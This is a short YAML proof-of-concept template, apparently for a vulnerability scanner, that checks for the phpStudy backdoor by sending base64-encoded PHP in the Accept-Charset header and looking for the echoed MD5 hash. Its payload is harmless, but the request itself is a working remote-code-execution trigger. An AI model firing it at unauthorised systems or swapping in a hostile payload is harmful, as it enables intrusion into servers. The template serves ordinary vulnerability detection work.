id: phpstudy-backdoor-rce

info:
    name: phpstudy-backdoor-rce
    author: 17bdw
    severity: high

manual: true
transport: http
set:
    r: randomLowercase(6)
    payload: base64("printf(md5('" + r + "'));")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php
            headers:
                Accept-Charset: '{{payload}}'
                Accept-Encoding: gzip,deflate
            follow_redirects: false
        expression: response.body.bcontains(bytes(md5(r)))
expression: r0()
